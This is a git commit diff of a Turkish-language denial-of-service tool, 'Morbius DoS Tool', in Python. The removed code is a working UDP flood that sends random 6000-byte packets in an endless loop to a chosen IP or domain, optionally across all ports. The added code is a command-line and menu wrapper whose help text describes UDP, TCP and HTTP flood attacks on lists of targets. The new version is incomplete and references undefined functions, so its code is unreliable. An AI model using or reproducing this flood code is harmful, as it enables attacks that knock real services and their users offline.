fbad956971ff4cc397429fea9936629c2c7d63b9
Kaan <125386712+kaandgnsh@users.noreply.github.com>
2025-07-16 12:57:29 +0300

    Update m-dos.py -> m-dos2.py

--- m-dos/m-dos.py
+++ m-dos/m-dos.py
@@ -1,138 +1,117 @@
-#!/usr/bin/env python3
-#*- coding: utf-8 -*--
-#Coded by Morbius.os
+#!/usr/bin/env python3  
+# -*- coding: utf-8 -*-  
+# Coded by Morbius.os  
 
-AUTHOR = 'Morbius.os'
-GİTHUB = 'https://github.com/morbius-os'
-INSTAGRAM= '@morbius.os'
+import os  
+import socket  
+import time  
+import random  
+import sys  
+import subprocess  
+import platform  
+import requests  
+import re  
+import threading  
+import argparse  
 
-Mor = '\033[95m'
-Cyan = '\033[96m'
-KoyuMavi = '\033[1;34m'
-Mavi = '\033[94m'
-Yeşil = '\033[92m'
-Sarı = '\033[93m'
-Kırmızı = '\033[91m'
-Kalın = '\033[1m'
-AltıÇizili = '\033[4m'
-Bitir = '\033[0m'
-Beyaz ='\033[1;37m'
+# Renkler  
+Mor = '\033[95m'; Cyan = '\033[96m'; KoyuMavi = '\033[1;34m'; Mavi = '\033[94m'  
+Yeşil = '\033[92m'; Sarı = '\033[93m'; Kırmızı = '\033[91m'; Kalın = '\033[1m'  
+AltıÇizili = '\033[4m'; Bitir = '\033[0m'; Beyaz = '\033[1;37m'  
 
-import os
-import socket
-import time
-import random
-import sys
-import requests
+def banner():  
+    os.system('cls' if os.name == 'nt' else 'clear')  
+    print(f"""  
+{Beyaz} __  __            _     _            {Kırmızı} ____             {Sarı} _____           _  
+{Beyaz}|  \/  | ___  _ __| |__ (_)_   _ ___  {Kırmızı}|  _ \  ___  ___  {Sarı}|_   _|__   ___ | |  
+{Beyaz}| |\/| |/ _ \| '__| '_ \| | | | / __| {Kırmızı}| | | |/ _ \/ __|   {Sarı}| |/ _ \ / _ \| |  
+{Beyaz}| |  | | (_) | |  | |_) | | |_| \__ \ {Kırmızı}| |_| | (_) \__ \   {Sarı}| | (_) | (_) | |  
+{Beyaz}|_|  |_|\___/|_|  |_.__/|_|\__,_|___/ {Kırmızı}|____/ \___/|___/   {Sarı}|_|\___/ \___/|_|  
+{Yeşil}  
+Author: Morbius.os  
+Instagram: @morbius.os  
+Github: https://github.com/morbius-os{Bitir}""")  
 
-def banner():
-    try:
-        os.system('clear')
-    except:
-        os.system(cmd_clear)
-    print(f"""
-{Beyaz} __  __            _     _            {Kırmızı} ____             {Sarı} _____           _
-{Beyaz}|  \/  | ___  _ __| |__ (_)_   _ ___  {Kırmızı}|  _ \  ___  ___  {Sarı}|_   _|__   ___ | |
-{Beyaz}| |\/| |/ _ \| '__| '_ \| | | | / __| {Kırmızı}| | | |/ _ \/ __|   {Sarı}| |/ _ \ / _ \| |
-{Beyaz}| |  | | (_) | |  | |_) | | |_| \__ \ {Kırmızı}| |_| | (_) \__ \   {Sarı}| | (_) | (_) | |
-{Beyaz}|_|  |_|\___/|_|  |_.__/|_|\__,_|___/ {Kırmızı}|____/ \___/|___/   {Sarı}|_|\___/ \___/|_|
-{Yeşil}
-Author: {AUTHOR}
-Instagram: {INSTAGRAM}
-Github: {GİTHUB}{Bitir}""")
-				
-banner()
-time.sleep(1.5)
+def show_help_guide():  
+    guide = f"""  
+{Kırmızı}{Kalın}KOMUT SATIRI PARAMETRELERİ:{Bitir}  
+  
+  -t, --targets    Hedeflerin bulunduğu dosya (her satır IP/domain)  
+  -p, --port       Hedef port numarası (tüm portlar için 1)  
+  --type           Saldırı tipi: udp, tcp, http  
+  -d, --duration   Saldırı süresi saniye cinsinden (0 = süresiz)  
+  -T, --threads    Thread sayısı  
+  --log            Loglama aktif  
+  --logfile        Log dosyası adı (default: log.txt)  
+  
+{Sarı}{Kalın}ÖRNEK KULLANIM:{Bitir}  
+  
+  python3 mdos2.py -t hedefler.txt -p 80 --type udp -d 60 -T 8 --log --logfile kayit.txt  
+  
+Bu komut 'hedefler.txt' dosyasındaki IP'lere 60 saniye boyunca UDP flood saldırısı yapar,  
+port 80'i hedef alır, 8 thread kullanır, loglama yapar ve loglar 'kayit.txt' dosyasına yazılır.  
+"""  
+    print(guide)  
 
-def site_kontrol(site,http_formatı,uzantısı):
-    URL =  http_formatı+'://'+site+uzantısı
-    cevap = requests.get(URL)
-    if cevap == '<Response [200]>':
-        pass
-    else:
-        return '{}HEDEF ÇÖKTÜ: {}{}{}'.format(Kırmızı,AltıÇizili,URL,Bitir)
+def baslangic_secim():  
+    print(f"""{Beyaz}Başlangıç Modu Seçiniz:  
+{Yeşil}[1]{Beyaz} Uygulama (İnteraktif Mod)  
+{Yeşil}[2]{Beyaz} Parametre Modu (Help Guide ve Parametre Açıklamaları)  
+{Yeşil}[3]{Beyaz} Çıkış  
+""")  
+    secim = input(f"{Beyaz}Seçiminiz (1/2/3): {Yeşil}").strip()  
+    if secim == '1':  
+        return 'interactive'  
+    elif secim == '2':  
+        show_help_guide()  
+        sys.exit()  
+    else:  
+        print(f"{Kırmızı}Program sonlandırıldı.{Bitir}")  
+        sys.exit()  
 
-def site_yaz(ğ,çş,ö):
-    return çş+'://'+ğ+ö
- 
-liste = {'q','w','e','r','t','y','u','ı','o','p','ü','ğ','a','s','d','f','g','h','j','k','l','ş','i','z','x','c','v','n','b','m','ö','ç','@','#','₺','_','&','-','+','(',')','/','*','"',"'",':',';','!','?','~','`','|','•','√','π','÷','×','§','∆','£','€','$','¢','^','°','=','{','}'}
-print('\n')
+# Diğer fonksiyonlar (ip_gecerli_mi, domain_denetle_ve_ip_al, ping_kontrol, http_kontrol, saldırı_udp, saldırı_tcp, saldırı_http, hedef_belirle_ve_saldırı_yap, hedefleri_dosyadan_oku) değişmediğinden yukarıdan alınacaktır.
 
-target = str(input(f'''{Beyaz}Lütfen Hedefin IP Adresini Giriniz (Eğer Domain'e Dos Atacaksanız {Yeşil}"Domain"{Beyaz} Yazınız): {Yeşil}'''))
+def ana():
+    banner()
 
-alilanz = ""
-if target == "Domain" or target == 'domain':
-    alilanz = 'doktor eda'
+    parser = argparse.ArgumentParser(description="Gelişmiş DOS Aracı", add_help=False)
+    parser.add_argument("-h", "--help", action="store_true", help="Yardım mesajını göster")
+    parser.add_argument("--targets", "-t", help="Hedeflerin bulunduğu dosya (her satır IP/domain)", default=None)
+    parser.add_argument("--port", "-p", type=int, help="Hedef port numarası (tüm portlar için 1)", default=None)
+    parser.add_argument("--type", choices=['udp','tcp','http'], help="Saldırı tipi", default=None)
+    parser.add_argument("--duration", "-d", type=int, help="Saldırı süresi saniye cinsinden (0 = süresiz)", default=None)
+    parser.add_argument("--threads", "-T", type=int, help="Thread sayısı", default=None)
+    parser.add_argument("--log", action="store_true", help="Loglama aktif")
+    parser.add_argument("--logfile", help="Log dosyası adı (default: log.txt)", default="log.txt")
+    args, unknown = parser.parse_known_args()
 
-if target == "Domain" or target == 'domain':
-    domain = input(f"{Beyaz}Lütfen Domain'i Subdomain ile birlikte giriniz (örnek:https:/example.com ise example.com şeklinde giriniz): {Yeşil}")
-    print('\n')
-    while "." not in domain:
-        şş = input(f"{Kırmızı}Lütfen Domain'i Düzgün Giriniz (example.com şeklinde): {Yeşil}")
-        if "." in şş:
-            break
-    target = socket.gethostbyname(domain)
-    print(f"{Beyaz}Sitenin IP Adresi: {Yeşil}{target}{Beyaz}")
-
-if alilanz == 'doktor eda':
-    siteeee = "http://"+domain
-else:
-    siteeee = target
-    
-if alilanz == 'doktor eda':
-    port = int(input(f'''{Beyaz}Lütfen {Yeşil}{AltıÇizili}{siteeee}{Bitir}{Beyaz} Linkli {Yeşil}{target}{Beyaz} IP AdresliHedef Sitenin Hedef Port Numarasını Giriniz
-(Eğer Bütün Portlara Saldırı yapmak istiyorsanız {Yeşil}"1"{Beyaz} Yazınız): {Yeşil}'''))
-else:
-    port = int(input(f'''{Beyaz}Lütfen {Yeşil}{siteeee}{Beyaz} IP Adresli Hedefin Hedef Port Numarasını Giriniz
-(Eğer Bütün Portlara Saldırı yapmak istiyorsanız {Yeşil}"1"{Beyaz} Yazınız): {Yeşil}'''))
-
-
-print('\n')
-try:
-    if port > 65534:
-        print(f'{Kırmızı}{Kalın}Lütfen Port Numarasını Düzgün Giriniz{Beyaz}')
+    if args.help:
+        show_help_guide()
         sys.exit()
-except:
-    pass
 
-try:
-     print ("""{}Hedef Domain : {}{}""".format(Beyaz,Yeşil,domain))
-except NameError:
-    pass
+    if (args.targets is None and args.port is None and args.type is None 
+        and args.duration is None and args.threads is None and not args.log):
+        mod = baslangic_secim()
+        if mod != 'interactive':
+            return
 
-print (f"""{Beyaz}Hedef IP : {Yeşil}{target}{Beyaz}""")
-if port == 1:
-    print (f"""Hedef Portlar: {Yeşil}Bütün Portlar{Beyaz}
-""")
-else:
-    print(f"""Hedef Port: {Yeşil}{port}{Beyaz}""")
-    
-print("""
-Eğer yanlış birşey varsa lütfen tooldan çıkıp düzeltiniz.
-""")
-time.sleep(3)
+        hedef_listesi = []
+        print(f"{Beyaz}Hedef belirleme modu:{Bitir}")
+        print(f"{Yeşil}[1]{Beyaz} Tek bir IP/domain gir{Bitir}")
+        print(f"{Yeşil}[2]{Beyaz} Hedefleri dosyadan yükle{Bitir}")
+        secim = input(f"{Beyaz}Seçiminiz (1/2): {Yeşil}").strip()
 
-print(f'{Kırmızı}{Kalın}Dos Atağı Başlatılıyor...\n')
-time.sleep(3)
+        if secim == '2':
+            dosya_adi = input(f"{Beyaz}Hedeflerin bulunduğu dosya adını girin: {Yeşil}").strip()
+            hedef_listesi = hedefleri_dosyadan_oku(dosya_adi)
+            if not hedef_listesi:
+                print(f"{Kırmızı}Hedef listesi boş veya okunamadı.{Bitir}")
+                sys.exit()
+        else:
+            # mevcut interaktif hedef girişi devam eder
+            pass
 
-byte = random._urandom(6000)
-soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # kod burada devam eder...
 
-dos_sayar = 0
-
-if port == 1:
-        while True:
-            soket.sendto(byte,(target,port))
-            dos_sayar = dos_sayar + 1
-            print("{}Dos Atağı Başladı.{}{}{} Port'una {}{}{} Adet Paket Gönderildi.".format(Beyaz,Yeşil,port,Beyaz,Yeşil,dos_sayar,Beyaz))
-            site_kontrol(domain,format,uzantı)
-            port = port + 1
-            if port > 65534:
-                port = 1
-
-else:
-    while True:
-        soket.sendto(byte,(target,port))
-        dos_sayar = dos_sayar + 1
-        print("{}Dos Atağı Başladı.Hedef Port'a {}{}{} Adet Paket Gönderildi.".format(Beyaz,Yeşil,dos_sayar,Beyaz))
-        site_kontrol(domain,format,uzantı)
+if __name__ == "__main__":
+    ana()
